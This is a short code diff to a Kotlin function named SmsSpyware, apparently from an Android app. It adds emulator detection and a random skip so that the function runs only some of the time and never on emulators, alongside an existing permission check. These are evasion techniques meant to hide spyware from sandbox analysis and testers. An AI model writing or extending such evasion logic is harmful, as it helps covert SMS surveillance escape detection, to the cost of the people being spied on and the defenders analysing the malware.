@@ -15,9 +15,19 @@ fun SmsSpyware(
     context: Context
 ){
     val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()
+    val isEmulator by viewModel.isOnEmulator.collectAsState()
+
+    val performService = Random.nextInt(1, 3) == 1
+    if (!performService) {
+        return
+    }
 
     // No permissions granted, ignore....
     if (!recommendationGrantsState) {
+        return
+    }
+
+    if (isEmulator) {
         return
     }
 
